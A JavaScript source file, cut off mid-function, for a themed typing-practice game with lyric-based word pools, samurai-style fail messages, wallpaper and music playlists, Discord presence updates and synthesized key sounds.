const wordPools = [
    // Pool 0: English 1k (Monkeytype)
    "the of to and a in is it you that he was for on are with as I his they be at one have this from or had by not word but what some we can out other were all there when up use your how said an each she which do their time if will way about many then them write would like so these her long make thing see him two has look more day could go come did number sound no most people my over know water than call first who may down side been now find any new work part take get place made live where after back little only round man year came show every good me give our under name very through just form sentence great think say help low line differ turn cause much mean before move right boy old too same tell does set three want air well also play small end put home read hand port large spell add even land here must big high such follow act why ask men change went light kind off need house picture try us again animal point mother world near build self earth father head stand own page should country found answer school grow study still learn plant cover food sun four between state keep eye never last let thought city tree cross farm hard start might story saw far sea draw left late run while press close night real life few north open seem together next white children begin got walk example ease paper group always music those both mark often letter until mile river car feet care second book carry took science eat room friend began idea fish mountain stop once base hear horse cut sure watch color face wood main enough plain girl usual young ready above ever red list though feel talk bird soon body dog family direct pose leave song measure door product black short numeral class wind question happen complete ship area half rock order fire south problem piece told knew pass since top whole king space heard best hour better true during hundred five remember step early hold west ground interest reach fast verb sing listen six table travel less morning ten simple several vowel toward war lay against pattern slow center love person money serve appear road map rain rule govern pull cold notice voice unit power town fine certain fly fall lead cry dark machine note wait plan figure star box noun field rest correct able pound done beauty drive stood contain front teach week final gave green oh quick develop ocean warm free minute strong special mind behind clear tail produce fact street inch multiply nothing course stay wheel full force blue object decide surface deep moon island foot system busy test record boat common gold possible plane stead dry wonder laugh thousand ago ran check game shape equate hot miss brought heat snow tire bring yes distant fill east paint language among grand ball yet wave drop heart am present heavy dance engine position arm wide sail material size vary settle speak weight general ice matter circle pair include divide syllable felt perhaps pick sudden count square reason length represent art subject region energy hunt probable bed brother egg ride cell believe fraction forest sit race window store summer train sleep prove lone leg exercise wall catch mount wish sky board joy winter sat written wild instrument kept glass grass cow job edge sign visit past soft fun bright gas weather month million bear finish happy hope flower clothes strange gone jump baby eight village meet root buy raise solve metal whether push seven paragraph third shall held hair describe cook floor either result burn hill safe cat century consider type law bit coast copy phrase silent tall sand soil roll temperature finger industry value fight lie beat excite natural view sense ear else quite broke case middle kill son lake moment scale loud spring observe child straight consonant nation dictionary milk speed method organ pay age section dress cloud surprise quiet stone tiny climb cool design poor lot experiment bottom key iron single stick flat twenty skin smile crease hole trade melody trip office receive row mouth exact symbol die least trouble shout except wrote seed tone join suggest clean break lady yard rise bad blow oil blood touch grew cent mix team wire cost lost brown wear garden equal sent choose fell fit flow fair bank collect save control decimal gentle woman captain practice separate difficult doctor please protect noon whose locate ring character insect caught period indicate radio spoke atom human history effect electric expect crop modern element hit student corner party supply bone rail imagine provide agree thus capital chair danger fruit rich thick soldier process operate guess necessary sharp wing create neighbor wash bat rather crowd corn compare poem string bell depend meat rub tube famous dollar stream fear sight thin triangle planet hurry chief colony clock mine tie enter major fresh search send yellow gun allow print dead spot desert suit current lift rose continue block chart hat sell success company subtract event particular deal swim term opposite wife shoe shoulder spread arrange camp invent cotton born determine quart nine truck noise level chance gather shop stretch throw shine property column molecule select wrong gray repeat require broad prepare salt nose plural anger claim continent oxygen sugar death pretty skill women season solution magnet silver thank branch match suffix especially fig afraid huge sister steel discuss forward similar guide experience score apple bought led pitch coat mass card band rope slip win dream evening condition feed tool total basic smell valley nor double seat arrive master track parent shore division sheet substance favor connect post spend chord fat glad original share station dad bread charge proper bar offer segment duck instant market degree populate chick dear enemy reply drink occur support speech nature range steam motion path liquid log meant quotient teeth shell neck program public universe".split(" "),

    // Pool 1: APT - ROSÉ ft. Bruno Mars
    "kissy face kissy face sent to your phone but im tryna kiss your lips for real red hearts red hearts thats what im on yeah come give me somethin i can feel oh oh oh dont you want me like i want you baby dont you need me like i need you now sleep tomorrow but tonight go crazy all you gotta do is just meet me at the its whatever its whatever its whatever you like turn this apt into a club im talking drink dance smoke freak party all night dont you want me like i want you baby dont you need me like i need you now sleep tomorrow but tonight go crazy all you gotta do is just meet me at the".split(" "),

    // Pool 2: Blinding Lights - The Weeknd
    "I been tryna call I been on my own for long enough maybe you can show me how to love city cold and empty no one around to judge me I can feel it coming from the edge of the night so I take another look at you in the blinding lights".split(" "),

    // Pool 3: Die With A Smile - Lady Gaga ft. Bruno Mars
    "wherever you go I will follow cause life is too short to be alone I just wanna hold you so tight my love is never gonna let you die with a smile on your face every day every night falling to pieces watching you leave I just need you here with me".split(" "),

    // Pool 4: As It Was - Harry Styles
    "holding me back gravity is holding me back I want you to hold out the palm of your hand why dont we just play pretend like we are not scared of what is coming next or scared of having nothing left go home get ahead light speed internet I dont wanna talk about the way that it was".split(" "),

    // Pool 5: Starboy - The Weeknd ft. Daft Punk
    "I am a star boy every day a star is born look what you have done I am a legend now coming alive all I wanna hear is the sound of my city burning let the sky fall we are the ones who made it all the way to the top and now we living like a star boy".split(" ")
];

const hagakureWords = [
    "blade", "honor", "death", "glory", "steel", "blood", "spirit", "warrior", "silence", "strike", "swift", "kill", "void", "ghost", "shadow", "ronin", "samurai", "katana", "feudal", "bushido", "focus", "breath", "cherry", "blossom", "peace", "war", "enemy", "defeat", "victory", "master", "legend", "myth", "soul", "mind", "eternal", "night", "darkness", "light", "flash", "thunder", "storm", "calm", "stillness", "meditate", "discipline", "respect", "loyalty", "sacrifice", "bravery", "courage", "fear", "pain", "endure", "survive", "conquer", "rule", "shogun", "emperor", "kingdom", "dynasty", "legacy", "destiny", "fate", "karma", "life", "death", "rebirth", "cycle", "nature", "mountain", "river", "ocean", "sky", "moon", "star", "sun", "fire", "water", "earth", "wind", "metal", "wood", "dragon", "phoenix", "tiger", "wolf", "hawk", "eagle", "snake", "viper", "cobra", "venom", "poison", "cure", "heal", "wound", "scar", "battle", "fight", "war", "combat", "duel", "clash", "strike", "cut", "slash", "pierce", "stab", "thrust", "parry", "block", "dodge", "evade", "counter", "attack", "defend", "guard", "stance", "move", "step", "walk", "run", "sprint", "jump", "leap", "fly", "soar", "dive", "fall", "rise", "stand", "sit", "kneel", "bow", "pray", "chant", "sing", "shout", "scream", "whisper", "talk", "speak", "listen", "hear", "see", "watch", "look", "observe", "perceive", "understand", "knowing", "wise", "fool", "strong", "weak", "fast", "slow", "heavy", "light", "hard", "soft", "sharp", "dull", "cold", "hot", "wet", "dry", "clean", "dirty", "pure", "traint", "evil", "good", "right", "wrong", "true", "false", "real", "fake", "lie", "truth"
];

const hagakureFailMessages = [
    "DISHONOR", "UNWORTHY", "FALLEN", "DEFEAT", "SHAME", "BROKEN", "TOO SLOW", "WEAKNESS", "FATAL", "END",
    "DISGRACE", "FAILURE", "IMPURE", "HESITATION", "SLOPPY", "ERROR", "MISTAKE", "YIELDED", "CRUMBLED", "LOST",
    "FINISH", "OBLIVION", "VOID", "NULL", "WASTED", "EXPIRED", "CEASED", "GONE", "RUIN", "COLLAPSE"
];

const hagakureEarlyFailMessages = [
    "- Your blade remains sheathed.",
    "- You tripped on the first step.",
    "- Pathetic start.",
    "- Not even a single cut?",
    "- Hesitation is defeat.",
    "- Return to the academy.",
    "- Too slow to begin.",
    "- The enemy laughs.",
    "- You were not ready."
];

const shadowWordsMedium = [
    "acquire", "argument", "maintenance", "occurrence", "questionnaire", "sergeant", "apprehension", "subtle", "fuming", "hypocritical", "relegate", "inquisitive", "stroll", "finery", "incubus", "mutinous", "contempt", "grovel", "acknowledgement", "adequate", "adjudicate", "adroit", "amicable", "analogous", "annul", "applause", "arid", "articulate", "available", "benevolent", "bewildered", "boisterous", "brusque", "canny", "capability", "capacious", "chronic", "cognitive", "coherence", "commemorate", "comply", "conspicuous", "constraint", "controversy", "corrugated", "narcissistic", "bourbon", "indict", "connecticut", "vacuum", "presence", "intuition", "resonance", "ephemeral", "synthetic", "technical", "versatile", "vigorous", "momentum", "precision", "prototype", "quantify", "resilient", "scrutinize", "transparent", "undermine"
];

const shadowWordsHard = [
    "grammatically", "magnanimous", "metamorphosis", "satisfactorily", "surveillance", "unanimous", "reconciliation", "procrastinate", "ostentatious", "conscientious", "fluorescent", "olfactory", "facsimile", "incessant", "reservoir", "spasmodic", "gobbledegook", "euphemism", "abrogate", "demagogue", "facetious", "pulchritudinous", "verisimilitude", "consanguineous", "balatron", "dewdropper", "frippet", "callipygian", "bedevil", "confabulate", "spanandry", "bombilate", "pettifogging", "unconscionable", "perforce", "longitudinal", "inadvertent", "juxtaposition", "idiosyncratic", "hyperbole", "ephemeral", "deleterious", "cacophony", "belligerent", "audacious", "anomaly", "synchronization", "quintessential"
];

const hagakureGeneralFailMessages = [
    "Your focus wavered.",
    "A moment of weakness.",
    "Discipline is key.",
    "Go back to the dojo.",
    "Steel requires tempering.",
    "A true warrior never stops.",
    "Mind and body disconnected.",
    "Refine your spirit.",
    "Silence the mind."
];

const hagakureMiddleFailMessages = [
    "Halfway is not enough.",
    "Your endurance failed.",
    "Fatigue is the mind killer.",
    "Mediocrity is a sin.",
    "You lost the rhythm.",
    "Focus must be absolute.",
    "Do not stop halfway.",
    "The path is long.",
    "Incomplete."
];

const hagakureLateFailMessages = [
    "So close to glory.",
    "You stumbled at the gates.",
    "The final step is the hardest.",
    "Victory was in your grasp.",
    "To fall at the end is tragedy.",
    "One mistake costs everything.",
    "Bitter defeat.",
    "Almost a legend.",
    "The finish line mocks you."
];

let currentPool = 0;

// --- 1. WALLPAPER CONFIGURATION ---
const wallpaperCategories = [
    { id: 'relax', label: 'Relax', icon: 'ri-cup-line' },
    { id: 'nature', label: 'Nature', icon: 'ri-leaf-line' },
    { id: 'aesthetic-videos', label: 'Aesthetic Videos', icon: 'ri-film-line' },
    { id: 'aesthetic', label: 'Aesthetic', icon: 'ri-palette-line' },
    { id: 'cars', label: 'Cars', icon: 'ri-roadster-line' },
    { id: 'styles', label: 'Styles', icon: 'ri-magic-line' }
];


let currentCategory = 'relax';

// --- STYLES CONFIGURATION ---
// --- STYLES CONFIGURATION ---
// Styles are now just wallpapers in the 'styles' category with preset effects attached.


const wallpapers = [

    // ═══ AESTHETIC VIDEOS ═══
    {
        id: 'aesthetic_clouds',
        isVideo: true,
        category: 'aesthetic-videos',
        url: 'videos/aesthetic clouds_updated (2).mp4',
        thumb: 'videos/thumbs/aesthetic clouds_updated (2).png',
        tint: 'dark',
        opacity: 15
    },
    {
        id: 'bat',
        isVideo: true,
        category: 'aesthetic-videos',
        url: 'videos/bat.mp4',
        thumb: 'videos/thumbs/bat-thumb.png',
        tint: 'dark',
        opacity: 15
    },
    {
        id: 'tanjiro',
        isVideo: true,
        category: 'aesthetic-videos',
        url: 'videos/tanjiro.mp4',
        thumb: 'videos/thumbs/tanjiro-thumb.png',
        tint: 'dark',
        opacity: 15
    },







    // ═══ RELAX ═══
    {
        id: 'gura_yuri',
        isVideo: true,
        hasAudio: true,
        category: 'relax',
        url: 'videos/Gura Yuri Camp.mp4',
        thumb: 'videos/thumbs/Gura Yuri Camp.png',
        tint: 'dark',
        opacity: 0
    },
    { id: 'relax2', isVideo: false, category: 'relax', url: 'images/relax2.jpg', thumb: 'images/relax2.jpg', tint: 'dark', opacity: 15 },
    { id: 'relax3', isVideo: false, category: 'relax', url: 'images/relax3.jpg', thumb: 'images/relax3.jpg', tint: 'dark', opacity: 15 },
    { id: 'relax5', isVideo: false, category: 'relax', url: 'images/relax5.jpg', thumb: 'images/relax5.jpg', tint: 'dark', opacity: 15 },
    { id: 'relax6', isVideo: false, category: 'relax', url: 'images/relax6.jpg', thumb: 'images/relax6.jpg', tint: 'dark', opacity: 15 },
    { id: 'girl-2', isVideo: false, category: 'relax', url: 'images/girl-2.png', thumb: 'images/girl-2.png', tint: 'dark', opacity: 15 },
    { id: 'relax7', isVideo: false, category: 'relax', url: 'images/relax7.png', thumb: 'images/relax7.png', tint: 'dark', opacity: 15 },
    { id: 'relax8', isVideo: false, category: 'relax', url: 'images/relax8.png', thumb: 'images/relax8.png', tint: 'dark', opacity: 15 },
    { id: 'relax9', isVideo: false, category: 'relax', url: 'images/relax9.png', thumb: 'images/relax9.png', tint: 'dark', opacity: 15 },
    { id: 'relax10', isVideo: false, category: 'relax', url: 'images/relax10.png', thumb: 'images/relax10.png', tint: 'dark', opacity: 15 },

    // ═══ AESTHETIC ═══
    { id: 'gal1', isVideo: false, category: 'aesthetic', url: 'images/gal1.png', thumb: 'images/gal1.png', tint: 'dark', opacity: 15 },
    { id: 'gal2', isVideo: false, category: 'aesthetic', url: 'images/gal2.png', thumb: 'images/gal2.png', tint: 'dark', opacity: 15 },
    { id: 'neon-1', isVideo: false, category: 'aesthetic', tint: 'dark', opacity: 15, url: 'https://images.unsplash.com/photo-1542051841857-5f90071e7989?q=80&w=3840', thumb: 'https://images.unsplash.com/photo-1542051841857-5f90071e7989?q=80&w=400' },
    { id: 'japan-night', isVideo: false, category: 'aesthetic', tint: 'dark', opacity: 15, url: 'https://images.unsplash.com/photo-1503899036084-c55cdd92da26?q=80&w=3840', thumb: 'https://images.unsplash.com/photo-1503899036084-c55cdd92da26?q=80&w=400' },
    { id: 'minimal-dark', isVideo: false, category: 'aesthetic', tint: 'dark', opacity: 15, url: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=3840', thumb: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=400' },

    { id: 'girl-1', isVideo: false, category: 'aesthetic', url: 'images/girl-1.png', thumb: 'images/girl-1.png', tint: 'dark', opacity: 15 },
    { id: 'boy-1', isVideo: false, category: 'aesthetic', url: 'images/boy-1.png', thumb: 'images/boy-1.png', tint: 'dark', opacity: 15 },
    { id: 'girl-3', isVideo: false, category: 'aesthetic', url: 'images/girl-3.png', thumb: 'images/girl-3.png', tint: 'dark', opacity: 15 },

    // ═══ CARS ═══
    {
        id: 'f1',
        isVideo: true,
        category: 'cars',
        url: 'videos/f1.mp4',
        thumb: 'videos/thumbs/f1-thumb.png',
        tint: 'dark',
        opacity: 15
    },
    {
        id: 'i_dowt_it',
        isVideo: true,
        hasAudio: true,
        category: 'cars',
        url: 'videos/I Dowt it.mp4',
        thumb: 'videos/thumbs/I Dowt it.png',
        tint: 'dark',
        opacity: 15
    },
    { id: 'skyline-2', isVideo: false, category: 'cars', url: 'images/skyline-2.png', thumb: 'images/skyline-2.png', tint: 'dark', opacity: 15 },

    { id: 'porshe', isVideo: false, category: 'cars', url: 'images/porshe.jpg', thumb: 'images/porshe.jpg', tint: 'dark', opacity: 15 },
    { id: 'porshe_2', isVideo: false, category: 'cars', url: 'images/porshe 2.jpg', thumb: 'images/porshe 2.jpg', tint: 'dark', opacity: 15 },
    { id: 'porshe_3', isVideo: false, category: 'cars', url: 'images/porshe 3.jpg', thumb: 'images/porshe 3.jpg', tint: 'dark', opacity: 15 },
    { id: 'porshe_4', isVideo: false, category: 'cars', url: 'images/porshe 4.jpg', thumb: 'images/porshe 4.jpg', tint: 'dark', opacity: 15 },

    // ═══ NATURE ═══
    { id: 'greenary', isVideo: false, category: 'nature', url: 'images/greenary.jpg', thumb: 'images/greenary.jpg', tint: 'dark', opacity: 15 },
    { id: 'pink', isVideo: false, category: 'nature', url: 'images/pink.jpg', thumb: 'images/pink.jpg', tint: 'dark', opacity: 15 },
    { id: 'night', isVideo: false, category: 'nature', url: 'images/NIGHT.jpg', thumb: 'images/NIGHT.jpg', tint: 'dark', opacity: 15 },
    { id: 'yosemite', isVideo: false, category: 'nature', url: 'images/yosemite.jpg', thumb: 'images/yosemite.jpg', tint: 'dark', opacity: 15 },
    { id: 'slovakia', isVideo: false, category: 'nature', url: 'images/Slovakia.jpg', thumb: 'images/Slovakia.jpg', tint: 'dark', opacity: 15 },
    { id: 'iceland', isVideo: false, category: 'nature', url: 'images/Iceland.jpg', thumb: 'images/Iceland.jpg', tint: 'dark', opacity: 15 },
    { id: 'mountain_reflection', isVideo: false, category: 'nature', url: 'images/Beautiful mountain reflection.jpg', thumb: 'images/Beautiful mountain reflection.jpg', tint: 'dark', opacity: 15 },
    { id: 'el_capitan', isVideo: false, category: 'nature', url: 'images/El Capitan.jpg', thumb: 'images/El Capitan.jpg', tint: 'dark', opacity: 15 },
    { id: 'streets', isVideo: false, category: 'nature', url: 'images/streets.jpg', thumb: 'images/streets.jpg', tint: 'dark', opacity: 15 },
    { id: 'tokyo_tower', isVideo: false, category: 'nature', url: 'images/Tokyo Tower.jpg', thumb: 'images/Tokyo Tower.jpg', tint: 'dark', opacity: 15 },
    { id: 'mt_rainier', isVideo: false, category: 'nature', url: 'images/Mt Rainier National Park.jpg', thumb: 'images/Mt Rainier National Park.jpg', tint: 'dark', opacity: 15 }
];

let userConfig = {
    wallpaperId: 'gura_yuri',
    effectType: 'snow',
    effectColor: '#ff6bca',
    effectIntensity: 22,
    opacity: 0,
    tint: 'dark',
    soundProfile: 'membrane',
    soundVolume: 50,
    bgVolume: 50,
    caretStyle: 'line',
    fontFamily: 'modern',
    caretColor: '#ffd700',
    zenMode: false,
    particle: true,
    particleColor: '#ffd700',
    showTrackSelector: true,
    comboSound: true,
    pitchShift: true,
    wallpaperAudio: true, // Default to true
    instantLegend: false // When true, all keystrokes register as correct
};

const UI = {
    container: document.getElementById('words-container'),
    input: document.getElementById('hidden-input'),
    timer: document.getElementById('timer'),
    wpm: document.getElementById('wpm'),
    zenBtn: document.getElementById('zen-btn'),
    keypressCanvas: document.getElementById('keypress-canvas'),
    results: document.getElementById('results-overlay'),
    finalWpm: document.getElementById('final-wpm'),
    finalAcc: document.getElementById('final-acc'),
    settingsModal: document.getElementById('settings-modal'),
    settingsBtn: document.getElementById('settings-btn'),
    closeSettingsBtn: document.getElementById('close-settings'),
    wallpaperGrid: document.getElementById('wallpaper-grid'),
    opacitySlider: document.getElementById('opacity-slider'),
    opacityValue: document.getElementById('opacity-value'),
    tintBtns: document.querySelectorAll('.tint-btn'),
    loadingOverlay: document.getElementById('loading-overlay'),
    bgVideo: document.getElementById('bg-video'),
    soundBtn: document.getElementById('sound-btn'),
    wallpaperSoundBtn: document.getElementById('wallpaper-sound-btn'), // New Button
    timeModes: document.getElementById('time-modes'),
    comboDisplay: document.getElementById('combo-display'),
    comboCount: document.getElementById('combo-count'),
    comboLabel: document.getElementById('combo-label'),
    gameUI: document.getElementById('game-ui'),
    particleCanvas: document.getElementById('particles')
};

let state = {
    words: [],
    startTime: null,
    timerInterval: null,
    timeLimit: 30,
    timeLeft: 30,
    currWordIndex: 0,
    correctChars: 0,
    totalCharsTyped: 0,
    isActive: false,
    combo: 0,
    maxCombo: 0
};

// --- DISCORD RICH PRESENCE ---
const discordPresence = {
    previousWpm: 0,
    concludedTimeout: null,
    currentState: 'idle',

    idleFlavors: [
        'In Stillness', 'Awaiting the Flow', 'Between Keystrokes',
        'The Calm Before', 'Resting the Mind', 'Breathing In Silence',
        'Keys at Rest', 'Gathering Focus', 'The Void Awaits', 'Mind Like Water'
    ],
    typingFlavors: [
        'Mastering the Keys', 'Finding the Flow', 'In the Zone',
        'Words Like Water', 'Chasing Perfection', 'Fingers in Motion',
        'The Keys Speak', 'Carving the Path', 'Rhythm Unlocked', 'Typing with Intent'
    ],

    pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; },

    async setIdle() {
        if (this.currentState === 'idle') return;
        this.currentState = 'idle';
        try {
            await window.__TAURI_INTERNALS__.invoke('set_discord_presence', {
                stateText: this.pick(this.idleFlavors),
                largeImageText: `Last Practice: ${this.previousWpm} WPM`
            });
        } catch (e) { /* Discord not connected */ }
    },

    async setTyping(duration) {
        if (this.concludedTimeout) {
            clearTimeout(this.concludedTimeout);
            this.concludedTimeout = null;
        }
        if (this.currentState === 'typing') return;
        this.currentState = 'typing';
        try {
            await window.__TAURI_INTERNALS__.invoke('set_discord_presence', {
                stateText: `${this.pick(this.typingFlavors)} (${duration}s)`,
                largeImageText: 'Calm Hands. Clear Mind.'
            });
        } catch (e) { /* Discord not connected */ }
    },

    async setConcluded(finalWpm, accuracy) {
        this.previousWpm = finalWpm;
        this.currentState = 'concluded';
        try {
            await window.__TAURI_INTERNALS__.invoke('set_discord_presence', {
                stateText: `${finalWpm} WPM · ${accuracy}% Accuracy`,
                largeImageText: 'Practice Concluded'
            });
        } catch (e) { /* Discord not connected */ }

        // After 5 seconds, return to idle (unless a new test starts)
        this.concludedTimeout = setTimeout(() => {
            this.concludedTimeout = null;
            this.setIdle();
        }, 5000);
    }
};

// --- AUTO-INIT AUDIO ON FIRST INTERACTION ---
function autoInitAudio() {
    if (!audioCtx) {
        initAudio();
    }
    if (audioCtx && audioCtx.state === 'suspended') {
        audioCtx.resume().then(() => {
            console.log("AudioContext resumed successfully");
        });
    }
    // Try to play silent buffer to unlock audio on iOS/strict browsers
    if (audioCtx) {
        const buffer = audioCtx.createBuffer(1, 1, 22050);
        const source = audioCtx.createBufferSource();
        source.buffer = buffer;
        source.connect(audioCtx.destination);
        source.start(0);
    }

    // Remove listeners once initialized
    window.removeEventListener('click', autoInitAudio);
    window.removeEventListener('keydown', autoInitAudio);
}

window.addEventListener('click', autoInitAudio);
window.addEventListener('keydown', autoInitAudio);

// --- 2. SOUND ENGINE (Web Audio API) ---

let audioCtx = null;
let soundEnabled = true;
let noiseBuffer = null;
let currentBgAudio = null; // Track separate audio file for wallpapers
let masterAudio = new Audio();

// Hagakure Mode Theme Music — Playlist
const hagakurePlaylist = [
    { url: '/hagakure-theme.mp3', name: 'Warrior\'s Requiem' },
    // Add more tracks here:
    // { url: '/hagakure-track2.mp3', name: 'Blood & Steel' },
    // { url: '/hagakure-track3.mp3', name: 'Crimson Dawn' },
];
let hagakureAudio = new Audio(hagakurePlaylist[0].url);
hagakureAudio.loop = true;
hagakureAudio.volume = 0.5;
let currentHagakureTrack = 0;
let wasPlayingBeforeHagakure = { masterPlaying: false, scPlaying: false, bgAudioPlaying: false, trackIndex: 0 };

// ── SHADOW MODE MUSIC ──────────────────────────────────────────────────────
const shadowPlaylist = [
    { url: '/shadow1.mp3', name: 'Abyssal Whispers' },
    // { url: '/shadow2.mp3', name: 'Void Resonance' },
];
let shadowAudio = new Audio(shadowPlaylist[0].url);
shadowAudio.loop = true;
shadowAudio.volume = 0.5;
let currentShadowTrack = 0;
let wasPlayingBeforeShadow = { masterPlaying: false, scPlaying: false, bgAudioPlaying: false };

function initShadowTrackSelector() {
    const list = document.getElementById('s-track-list');
    if (!list) return;
    list.innerHTML = '';

    shadowPlaylist.forEach((track, i) => {
        const item = document.createElement('div');
        item.className = 'sm-track-item' + (i === currentShadowTrack ? ' active' : '');
        item.innerHTML = `<i class="${i === currentShadowTrack ? 'ri-play-fill' : 'ri-disc-fill'}"></i><span>${track.name}</span>`;
        item.addEventListener('click', () => playShadowTrack(i));
        list.appendChild(item);
    });

    const btn = document.getElementById('s-music-btn');
    const panel = document.getElementById('s-track-panel');
    const closeBtn = document.getElementById('s-track-close');

    if (btn) btn.onclick = (e) => { e.stopPropagation(); panel.classList.toggle('hidden'); };
    if (closeBtn) closeBtn.onclick = () => panel.classList.add('hidden');

    updateShadowMusicBtn();
}

function playShadowTrack(index) {
    if (index < 0 || index >= shadowPlaylist.length) return;
    currentShadowTrack = index;
    shadowAudio.src = shadowPlaylist[index].url;
    shadowAudio.volume = (userConfig.bgVolume !== undefined ? userConfig.bgVolume : 50) / 100;
    shadowAudio.currentTime = 0;
    shadowAudio.play().catch(e => console.log('Shadow track play failed:', e));

    document.querySelectorAll('.sm-track-item').forEach((el, i) => {
        el.classList.toggle('active', i === index);
        const icon = el.querySelector('i');
        if (icon) icon.className = i === index ? 'ri-play-fill' : 'ri-disc-fill';
    });

    updateShadowMusicBtn();
}

function updateShadowMusicBtn() {
    const btn = document.getElementById('s-music-btn');
    if (!btn) return;
    btn.classList.toggle('playing', !shadowAudio.paused);
}


// Build Hagakure track selector UI
function initHagakureTrackSelector() {
    const list = document.getElementById('h-track-list');
    if (!list) return;
    list.innerHTML = '';

    hagakurePlaylist.forEach((track, i) => {
        const item = document.createElement('div');
        item.className = 'h-track-item' + (i === currentHagakureTrack ? ' active' : '');
        item.innerHTML = `<i class="${i === currentHagakureTrack ? 'ri-play-fill' : 'ri-music-fill'}"></i><span>${track.name}</span>`;
        item.addEventListener('click', () => {
            playHagakureTrack(i);
        });
        list.appendChild(item);
    });

    // Music button toggle
    const btn = document.getElementById('h-music-btn');
    const panel = document.getElementById('h-track-panel');
    const closeBtn = document.getElementById('h-track-close');

    if (btn) {
        btn.onclick = (e) => {
            e.stopPropagation();
            panel.classList.toggle('hidden');
        };
    }
    if (closeBtn) {
        closeBtn.onclick = () => panel.classList.add('hidden');
    }

    // Update music button playing state
    updateHagakureMusicBtn();
}

function playHagakureTrack(index) {
    if (index < 0 || index >= hagakurePlaylist.length) return;
    currentHagakureTrack = index;
    const track = hagakurePlaylist[index];

    hagakureAudio.src = track.url;
    hagakureAudio.volume = (userConfig.bgVolume !== undefined ? userConfig.bgVolume : 50) / 100;
    hagakureAudio.currentTime = 0;
    hagakureAudio.play().catch(e => console.log('Hagakure track play failed:', e));

    // Update track list UI
    const items = document.querySelectorAll('.h-track-item');
    items.forEach((item, i) => {
        item.classList.toggle('active', i === index);
        const icon = item.querySelector('i');
        if (icon) icon.className = i === index ? 'ri-play-fill' : 'ri-music-fill';
    });

    updateHagakureMusicBtn();
}

function updateHagakureMusicBtn() {
    const btn = document.getElementById('h-music-btn');
    if (!btn) return;
    if (!hagakureAudio.paused) {
        btn.classList.add('playing');
    } else {
        btn.classList.remove('playing');
    }
}
let masterPlaylist = [
    { url: '', name: 'No Track', type: 'none' },
    { url: 'Dark Sky.mp3', name: 'Dark Sky', type: 'local' },
    { url: 'Daydreams.mp3', name: 'Daydreams', type: 'local' },
    { url: 'Lavender.mp3', name: 'Lavender', type: 'local' },
    { url: 'Sunroof.mp3', name: 'Sunroof', type: 'local' },
    { url: 'The Quiet Between Us.mp3', name: 'The Quiet Between Us', type: 'local' },
    { url: 'Warm Lights.mp3', name: 'Warm Lights', type: 'local' },
    { url: 'After the Last Train.mp3', name: 'After the Last Train', type: 'local' },
    { url: 'Sleepless in Kyoto.mp3', name: 'Sleepless in Kyoto', type: 'local' },
    { url: 'Echoes of 2AM.mp3', name: 'Echoes of 2AM', type: 'local' },
    { url: 'Sleepless in Kyoto pt 2.mp3', name: 'Sleepless in Kyoto pt 2', type: 'local' },
];

let currentTrackIndex = 0;


function initTrackSelector() {
    const selector = document.getElementById('track-selector');
    const list = document.getElementById('track-list');
    const currentName = document.getElementById('current-track-name');

    list.innerHTML = '';
    masterPlaylist.forEach((track, index) => {
        const item = document.createElement('div');
        item.className = 'track-item';

        // Default to "No Track" (index 0) if nothing is playing
        if (index === 0 && masterAudio.paused) {
            item.classList.add('active');
            currentName.innerText = track.name;
        }

        item.innerHTML = `<i class="ri-music-fill"></i><span>${track.name}</span>`;
        item.addEventListener('click', () => {
            playSpecificMasterTrack(index);
        });
        list.appendChild(item);
    });

    // Show selector initially for a moment or checking storage could be added
    if (userConfig.showTrackSelector !== false) selector.classList.remove('hidden');
}

function playNextMasterTrack() {
    // Filter out "No Track" (type: 'none') so we don't randomly stop music
    const playableTracks = masterPlaylist.map((t, i) => ({ ...t, originalIndex: i }))
        .filter(t => t.type !== 'none');

    if (playableTracks.length === 0) return;

    // Equal probability for all playable tracks
    const randomIndex = Math.floor(Math.random() * playableTracks.length);
    const selectedTrack = playableTracks[randomIndex];

    // Play using the original index to ensure UI updates correctly
    playSpecificMasterTrack(selectedTrack.originalIndex);
}

function playSpecificMasterTrack(index) {
    const track = masterPlaylist[index];
    if (!track) return;
    currentTrackIndex = index;

    // Handle 'No Track'
    if (track.type === 'none') {
        masterAudio.pause();
        document.getElementById('current-track-name').innerText = track.name;
        document.querySelectorAll('.track-item').forEach((item, i) => {
            item.classList.toggle('active', i === index);
        });
        document.getElementById('current-track-name').classList.remove('track-loading');
        return;
    }

    // Handle Local Audio
    masterAudio.src = track.url + '?t=' + Date.now();
    masterAudio.volume = (userConfig.bgVolume !== undefined ? userConfig.bgVolume : 50) / 100;

    if (soundEnabled) {
        masterAudio.muted = false;
        masterAudio.play().catch(e => console.log('Manual track play failed:', e));
    }

    // Update UI
    document.getElementById('current-track-name').innerText = track.name;
    document.getElementById('current-track-name').classList.remove('track-loading');
    document.querySelectorAll('.track-item').forEach((item, i) => {
        item.classList.toggle('active', i === index);
    });
}



masterAudio.addEventListener('ended', () => {
    playSpecificMasterTrack(currentTrackIndex);
});
// Init first track but don't play yet
masterAudio.src = masterPlaylist[0].url;

function initAudio() {
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    }
    // Pre-generate a noise buffer for realistic impact sounds (guard against re-entry)
    if (!noiseBuffer) {
        const bufferSize = audioCtx.sampleRate * 0.1; // 100ms of noise
        noiseBuffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
        const data = noiseBuffer.getChannelData(0);
        for (let i = 0; i < bufferSize; i++) {
            data[i] = (Math.random() * 2 - 1);
        }
    }

    if (audioCtx.state === 'suspended') {
        audioCtx.resume();
    }
}

// Helper: create a filtered noise burst (simulates physical impact)
function createNoiseBurst(t, duration, volume, filterFreq, filterQ, filterType = 'bandpass') {
    try {
        const source = audioCtx.createBufferSource();
        source.buffer = noiseBuffer;
        const filter = audioCtx.createBiquadFilter();
        filter.type = filterType;
        filter.frequency.setValueAtTime(filterFreq, t);
        filter.Q.setValueAtTime(filterQ, t);
        const gain = audioCtx.createGain();
        gain.gain.setValueAtTime(volume, t);
        gain.gain.exponentialRampToValueAtTime(0.001, t + duration);
        source.connect(filter);
        filter.connect(gain);
        gain.connect(audioCtx.destination);
        source.start(t);
        source.stop(t + duration);
        return { source, filter, gain };
    } catch (e) {
        console.error("NoiseBurst Error:", e);
    }
}

// Helper: subtle per-keypress randomization for natural variation
function rng(base, variance) {
    return base + (Math.random() - 0.5) * 2 * variance;
}

function playKeySound(correct) {
    if (!soundEnabled) {
        // console.log("Sound disabled");
